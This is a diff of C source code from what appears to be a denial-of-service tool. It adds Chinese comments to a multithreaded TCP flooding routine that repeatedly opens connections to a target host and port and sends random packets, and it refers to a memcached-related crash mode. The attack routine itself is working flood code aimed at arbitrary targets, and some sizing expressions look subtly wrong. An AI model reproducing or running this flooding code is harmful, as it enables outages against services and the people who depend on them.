@@ -3,35 +3,59 @@
 #include "dos.h"
 #include "util.h"
 
-#include <math.h>//pow
-#include <stdio.h>//close
+#include <math.h>
+#include <stdio.h>
 
 #ifndef DOUBLE_MAX
 #define DOUBLE_MAX 0.0
 #endif
 
 
-
+//这次发送数据包的数量
 double psent;
+
+//攻击目标IP
 char* __host;
+
+//攻击目标端口
 int __port;
+
+// 线程数
 int tcount = 0;
+
+//互斥信号量
 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
+
+//是否在标准输出上展示攻击数据信息
 bool status;
+
+//衡量数据包的单位 1:表示B, 2:表示KB ...
 uint8_t metrics;
-double psize;//one packet size in selected metrics
-bool __run;//still running?
 
-uint64_t pc;//Now it used for speed counting
-bool use_dos_sleep;
-int dos_sleep;
+//所选指标（单位）中的一个数据包大小
+double psize;
 
-int64_t plen;//packet length in bytes
-clock_t tm;//last time stat updated
-int64_t pc_old;//packets count on last stat update
-char *smetrics;//string of metrics type
-double psent_old;//old packet sendings(when dos_stat() was called lsat time)
+// 是否还在运行
+bool __run;
 
+//用来计算速度
+uint64_t pc;
+
+//一个数据包的字节数
+int64_t plen;
+
+//上一次更新状态的时间
+clock_t tm;
+
+
+
+// 数据包单位 "B" "KB" "MB" "GB" "TB"
+char *smetrics;
+
+//上衣发送的数据包数量
+double psent_old;
+
+//退出线程
 void __exit()
 {
     __run = false;
@@ -45,7 +69,8 @@ void __exit()
     exit(0);
 }
 
-void __perror(){//for debugging
+//用来Debug
+void __perror(){
     __run = false;
     pthread_mutex_lock(&mutex);
     printf("%c[2K", 27);
@@ -54,15 +79,20 @@ void __perror(){//for debugging
     pthread_mutex_unlock(&mutex);
     exit(-1);
 }
+
+
 void _dos_tcp(char* host, int port, char* packet)
 {
     tcount++;
     
     bool RAND_PACKET = (packet == NULL);
 
+    
     if (port == 0) {
         port = randport();
     }
+    
+    //创建TCP连接
     int sock = dos_tcp_sock(host, port);
     if (sock < 0) {
         pthread_mutex_lock(&mutex);
@@ -72,15 +102,14 @@ void _dos_tcp(char* host, int port, char* packet)
         pthread_mutex_unlock(&mutex);
         return;
     }
+
+    //申请接受数据缓冲区
     char* buf = (char*)malloc(1024 * sizeof(buf));
     size_t _bufsize = 1024 * sizeof(buf);
 
     while(1) 
     {
-        //if(use_dos_sleep){
-        //    sleep_ms(dos_sleep);
-        //}
-
+        
         if (!__run) {
             shutdown(sock, 2);
             close(sock);
@@ -91,13 +120,20 @@ void _dos_tcp(char* host, int port, char* packet)
             dperror("Failed to open socket");
         }
 
+        //随机生成一个数据包
         if (RAND_PACKET) {
             packet = randstring(randrange(64, 2048));
         }
+
+        //向目标发送数据包
         if (dos_tcp_send_noalloc(sock, packet, buf, _bufsize)) {
             int _error = 0;
             socklen_t len = sizeof(error);
+
+            //getsockopt()函数用于获取任意类型、任意状态套接口的选项当前值
+            //SO_ERROR获取错误状态
             getsockopt(sock, SOL_SOCKET, SO_ERROR, &_error, &len);
+            
             if (_error != 0) {
                 pthread_mutex_lock(&mutex);
                 shutdown(sock, 2);
@@ -110,7 +146,8 @@ void _dos_tcp(char* host, int port, char* packet)
                 pthread_mutex_unlock(&mutex);
             }
         }
-        if(status){//we are displaying status so we need to count packets
+
+        if(status){
             psent+=psize;
             pc++;
         }
@@ -119,7 +156,8 @@ void _dos_tcp(char* host, int port, char* packet)
     tcount--;
 }
 
-void _dos_stat()//update stat
+//更新状态
+void _dos_stat()//update status
 {
     success("Status:");
     success("Hit ^C to exit");
@@ -137,6 +175,7 @@ void _dos_stat()//update stat
 
 }
 
+// 将攻击参数 host ip packet mode 打包
 _dos_param* _init_dos_p(char* host, int port, char* packet, uint8_t mode)
 {
     _dos_param* p = malloc(sizeof(_dos_param) + (strlen(host) + strlen(packet)) * sizeof(char));
@@ -147,6 +186,7 @@ _dos_param* _init_dos_p(char* host, int port, char* packet, uint8_t mode)
     return p;
 }
 
+// 调用 _dos_tcp
 void __dos_wrapper(_dos_param* x)
 {
     if (x->mode == MODE_TCP) {
@@ -156,6 +196,7 @@ void __dos_wrapper(_dos_param* x)
         assert(false);
     }
 }
+
 
 void dos(char* host, int port, char* packet, int _tcount, int mode)
 {
@@ -172,10 +213,11 @@ void dos(char* host, int port, char* packet, int _tcount, int mode)
     __port = port;
     psent_old=0.0;
     psent=0.0;
+
     _dos_param* p = _init_dos_p(host, port, packet, mode);
     pthread_t* _dos = (pthread_t*)malloc(sizeof(pthread_t) * (_tcount + 1));
-    // pthread_mutex_init(&mutex, NULL);
-    if(status&&mode!=MODE_MEMCRASHED){
+
+    if(status && mode != MODE_MEMCRASHED){
         pthread_create(&_dos[0], NULL, (void*)_dos_stat, NULL);
         status=1;
     }else{
